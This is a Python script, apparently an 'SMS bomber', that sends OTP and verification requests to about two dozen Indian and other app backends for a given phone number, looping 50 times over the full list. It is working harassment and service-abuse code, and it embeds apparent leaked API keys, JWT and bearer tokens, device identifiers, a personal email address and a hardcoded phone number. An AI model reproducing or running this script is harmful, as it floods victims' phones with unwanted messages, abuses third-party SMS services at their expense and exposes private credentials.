import requests
import time

def smsgf(number):
    number = str(number)

    apis = [
        {
            "url": "https://www.nykaafashion.com/webscripts/api/otp/generate",
            "method": "POST",
            "headers": {
                "Host": "www.nykaafashion.com",
                "platform": "Android",
                "build": "11671",
                "version": "2.6.7",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.11.0"
            },
            "data": {"customer_mobile": number}
        },
        {
            "url": "https://charge.tracking.blucharge.net/api/v1/auth/send-otp",
            "method": "POST",
            "headers": {
                "Host": "charge.tracking.blucharge.net",
                "authorization": "Bearer",
                "refresh_token": "",
                "appversion": "3007",
                "platform": "ANDROID",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.11.0"
            },
            "data": {"phone": number}
        },
        {
            "url": "https://rider.tracking.blucgn.com/api/v2/app/auth/otp",
            "method": "POST",
            "headers": {
                "Host": "rider.tracking.blucgn.com",
                "user-agent": "okhttp/4.12.0",
                "deviceid": "b58f65bd9a9d1811",
                "appversion": "631",
                "platform": "ANDROID",
                "serviceregionid": "1",
                "zoneid": "1",
                "country": "IN",
                "accounttype": "personal",
                "hash": "bf16c4fc13296d3b854cbe1d77ad272db20fee15699747aabac47bfbcec98f30",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip"
            },
            "data": {"callingCode": "+91", "phone": number, "verified": False}
        },
        {
            "url": f"https://sms.textspeed.in/vb/apikey.php?apikey=RVqaLJsKjwLf9JeO&senderid=SRMCEM&templateid=1707171826803972840&number=91{number}&message=Your%20OTP%20for%20SRMP%20Cements%20Mobile%20App%20is%20OTP%204730.Use%20this%20code%20to%20complete%20your%20mobile%20number%20verification%20for%20cement%20purchases%20-SRMCEM",
            "method": "GET",
            "headers": {
                "user-agent": "Dart/3.4 (dart:io)",
                "accept": '{"Content-type": "application/json","Access-Control-Allow-Origin":"*","Access-Control-Allow-Methods":"application/json"}',
                "accept-encoding": "gzip",
                "host": "sms.textspeed.in"
            }
        },
        {
            "url": "https://apps.abacusdesk.com/max_cement/dd_api/app_karigar/karigarLoginOtp",
            "method": "POST",
            "headers": {
                "Host": "apps.abacusdesk.com",
                "Connection": "keep-alive",
                "Content-Length": "26",
                "sec-ch-ua": '"Not)A;Brand";v="99", "Android WebView";v="127", "Chromium";v="127"',
                "Accept": "application/json, text/plain, */*",
                "sec-ch-ua-platform": "Android",
                "sec-ch-ua-mobile": "?1",
                "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-E5260 Build/UP1A.231005.007;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.64 Mobile Safari/537.36",
                "Token": "Bearer undefined",
                "Content-Type": "application/json",
                "Origin": "https://localhost",
                "X-Requested-With": "com.app.max_cement",
                "Sec-Fetch-Site": "cross-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://localhost/",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9"
            },
            "data": {"mobile_no": number}
        },
        {
            "url": "https://drogon.schmooze.tech/v1/auth/login/otp/send",
            "method": "POST",
            "headers": {
                "Host": "drogon.schmooze.tech",
                "schmze-app-session-id": "df865ef5-1899-4be9-b406-8b6aec248764",
                "schmze-app-platform": "android",
                "schmze-app-version": "4.4.11",
                "schmze-app-device-id": "b58f65bd9a9d1811",
                "session_id": "df865ef5-1899-4be9-b406-8b6aec248764",
                "content-type": "application/json",
                "content-length": "67",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.11.0"
            },
            "data": {"attempt": 0, "contact_no": f"+91{number}", "udk": "b58f65bd9a9d1811"}
        },
        {
            "url": "https://api.beepkart.com/user/api/v2/login/public/send-otp",
            "method": "POST",
            "headers": {
                "Host": "api.beepkart.com",
                "authorization": "Bearer",
                "originid": "1234",
                "userid": "0",
                "changesorigin": "customerAppLogin",
                "appname": "CustomerAppAndroid_V2",
                "appversion": "2.0.28",
                "appversioncode": "20028",
                "cityid": "",
                "sessionid": "4f669469-b4c1-4d89-b0c7-8c43dcc0688e",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.3"
            },
            "data": {
                "blockNotification": False,
                "city": 362,
                "consent": True,
                "phone": number,
                "sessionInfo": {
                    "deviceInfo": {
                        "deviceRawString": "device_token=236c2d3b-ec6e-43d8-8cd0-31b79cd3dbb4; mobile=CustomerAppAndroid_V2; versionCode=20028; versionName=2.0.28; os_version=14; deviceManufacturer=samsung; model=SM-F7110"
                    },
                    "sessionId": "4f669469-b4c1-4d89-b0c7-8c43dcc0688e",
                    "sessionRawString": "utm_source=google-play&utm_medium=organic"
                },
                "source": "myaccount"
            }
        },
        
        {
            "url": "http://generic.agentjacksbar.com/BarStockExchangeService.asmx/SendOTP",
            "method": "POST",
            "headers": {
                "Accept-Encoding": "identity",
                "X-Titanium-Id": "4143a6a6-4f24-4743-99da-051fd7508f62",
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Requested-With": "XMLHttpRequest",
                "User-Agent": "Appcelerator Titanium/12.1.2 (SM-F7110; Android API Level: 34; en-US;)",
                "Content-Length": "145",
                "Host": "generic.agentjacksbar.com",
                "Connection": "Keep-Alive"
            },
            "data": "MobileNo=9336734442&hashkey=CwKSFzMuw%252Bd&UserID=0&GameName=123&PKey=2bd17ab4-19a7-4a8b-8af1-c2b915069e32608&deployType=production&platform=AJB"
        },
        
        {
            "url": "https://nfapi.naturefit.in/api/auth/localsignup",
            "method": "POST",
            "headers": {
                "user-agent": "Dart/3.0 (dart:io)",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "content-length": "76",
                "host": "nfapi.naturefit.in"
            },
            "data": {"mobile": number, "email": None, "otp": None, "doctor_reference_code": None}
        },
        
       
        {
            "url": "https://www.apnidukandari.com/api/register",
            "method": "POST",
            "headers": {
                "User-Agent": "okhttp/3.12.1",
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip",
                "Content-Type": "application/json"
            },
            "data": {
                "first_name": "YTRAVAN",
                "email": "shivamrajput662006@gmail.com",
                "uuid": "100391226984769639023",
                "avatar": None,
                "number": number,
                "privacy": True,
                "token": "06162cc11cd8cf0958ebbc62fadc4a48"
            }
        },
       
        {
            "url": "https://services.mxgrability.rappi.com/api/twilio-auth/verification-code/v2/send",
            "method": "POST",
            "headers": {
                "Host": "services.mxgrability.rappi.com",
                "content-type": "application/json; charset=utf-8",
                "content-length": "69",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1"
            },
            "data": {
                "country_code": "+91",
                "phone": number,
                "locale": "es",
                "via": "sms"
            }
        },
        {
            "method": "POST",
            "url": "https://indpe.co.in//user_apis/api.php",
            "headers": {
                "Content-Length": "95",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "Host": "indpe.co.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            },
            "data": "type=sendOTP&number={number}&hash=296cace78970b1fafafbc596f04b204c&ip=---&city=---&region=---"
        },
        {
            "method": "POST",
            "url": "https://tileswale.com/api/v45/user_otp_send",
            "headers": {
                "Host": "tileswale.com",
                "user-agent": "android",
                "twappversion": "2.1.3",
                "twapiversion": "v45",
                "twdevicemanufacturer": "samsung",
                "twdeviceosversion": "34",
                "twplatform": "1",
                "twdevicewidth": "1260",
                "twdeviceheight": "2624",
                "twtoken": "",
                "twlanguage": "",
                "twjwttoken": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqd3RUb2tlbiI6IlRpbGVzIFdhbGUiLCJqd3RTZWNyZXRLZXkiOiJ0d0BkZXZlbG9wZXJzQDkwMzM5MDk5In0.tbgYE2h0ZJ7o9I1bNGtNc1wj28mRxFJmh76u7nIXPf0",
                "content-type": "application/x-www-form-urlencoded",
                "accept-encoding": "gzip"
            },
            "data": f"mobile={number}"
        },
        {
            "method": "POST",
            "url": "https://anubhutiapis.channel-dss-r1-anubhuti-prod-vpn.ap.e06.c01.johndeerecloud.com/api/registration/resendOTPOnMobile",
            "headers": {
                "Authorization": "Bearer gAAAAABlOOZpZ-GfE6L5AfLC6fmtqNDJXWnyIZR",
                "LanguageCulture": "en-US",
                "Content-Type": "application/json; charset=utf-8",
                "ADRUM_1": "isMobile:true",
                "ADRUM": "isAjax:true",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "Host": "anubhutiapis.channel-dss-r1-anubhuti-prod-vpn.ap.e06.c01.johndeerecloud.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "Content-Length": "41"
            },
            "data": {
                "isExist": False,
                "MobileNo": number
            }
        },

        
        {
            "method": "POST",
            "url": "https://api.thebillbook.com/v1/getOTP",
            "headers": {
                "Host": "api.thebillbook.com",
                "x-auth-token": "",
                "content-type": "application/json; charset=UTF-8",
                "content-length": "53",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.3"
            },
            "data": {
                "loginType": "Otp Generated",
                "mobileNo": number
            }
        },

        {
            "method": "POST",
            "url": "https://developer.hihelloapp.com/api/v1/gupshup-otp-authenticate",
            "headers": {
                "Host": "developer.hihelloapp.com",
                "accept": "application/json",
                "authorization": "Bearer",
                "x-language": "en",
                "content-type": "application/x-www-form-urlencoded",
                "content-length": "23",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.12.0"
            },
            "data": f"contact_no=91{number}"
        },

        
        {
            "method": "POST",
            "url": "https://docon.co.in/api/v1/user/online-login",
            "headers": {
                "Host": "docon.co.in",
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "content-length": "29",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.2.1"
            },
            "data": {
                "mobileNumber": number
            }
        },
        {
            "method": "POST",
            "url": "https://api.turftown.in/api/v2/user/send_otp",
            "headers": {
                "Host": "api.turftown.in",
                "accept": "application/json, text/plain, */*",
                "access-control-allow-origin": "*",
                "x-access-token": "",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.12"
            },
            "data": {"phone": number}
        },
        {
            "method": "POST",
            "url": f"https://resellme.work/UserEngine/UserLoginOTPServlet?phoneNumber={number}",
            "headers": {
                "deviceModel": "Samsung_SM-F7110",
                "androidId": "c7abc1fd7459e84c",
                "deviceId": "[116,56,40,-22,41,-70,123,30,-91,28,-86,-37,-22,60,31,-125,58,-78,53,-27,-11,-18,94,-38,5,-98,-14,96,-55,59,-92,-44]",
                "version": "722",
                "Host": "resellme.work",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.12.13"
            },
            "data": ""
        },
        {
            "method": "POST",
            "url": "https://animall.in/zap/auth/login",
            "headers": {
                "Host": "animall.in",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.11"
            },
            "data": {"phone": number, "signupPlatform": "NATIVE_ANDROID"}
        },
        {
            "method": "POST",
            "url": "https://api.charzer.com/auth-service/send-otp",
            "headers": {
                "Host": "api.charzer.com",
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {"appSource": "CHARZER_APP", "mobileNumber": number}
        },
        {
            "method": "POST",
            "url": "https://e2food.in/api/user/login.php",
            "headers": {
                "Host": "e2food.in",
                "authorization": "",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.10.0"
            },
            "data": {
                "mobile": f"+{number}",
                "fcm": "dQZMxOGfQKqy1Tsdou9Dat:APA91bEXJrEMss2ybfp5qFeoo--inrHXrq-XSmA4lp3oef1_nbVwgqdV0mr5T3OMzXLPzjmeRd21bYn92boie81mazcdhUrptLqccuo0QAxzWilP_k1UwyuqfMYB64Jom7KJyNw7ByYi",
                "version": "1.0.7",
                "device": "Samsung SM-F7110 samsung (14)"
            }
        },
        {
            "method": "POST",
            "url": "https://mobile-api.thirdwavecoffee.in/api/v1/sendOTP",
            "headers": {
                "Host": "mobile-api.thirdwavecoffee.in",
                "access_token": "",
                "version": "2.5.11",
                "devicetype": "android",
                "package_name": "in.thirdwavecoffee.android",
                "user_preferences": "",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.11.0"
            },
            "data": {"phoneNumber": number}
        },
        {
            "method": "POST",
            "url": f"https://apps.driveu.in/profile/trigger-otp/?a_v=239&imei=006748ff-6047-4ff6-8c02-112b03f1457e&src=android&deviceDetails=Samsung%20SM-F7110&os_version=Android%20Version%20is%20%3A%2034%20(14)&androidDeviceId=c7abc1fd7459e84c&googleAdvertiserId=d3ee50e2-c6ac-4ac5-9c14-6aff6b41c785",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "apps.driveu.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.7.2"
            },
            "data": f"mobile={number}"
        }
    ]

    for _ in range(50):  # Reducing the number of iterations
        for api in apis:
            try:
                if api["method"] == "POST":
                    response = requests.post(api["url"], headers=api["headers"], json=api.get("data"))
                else:
                    response = requests.get(api["url"], headers=api["headers"])
                
                print(f"API {api['url']} response: {response.status_code}, {response.text}")
            except Exception as e:
                print(f"Error calling {api['url']}: {str(e)}")
            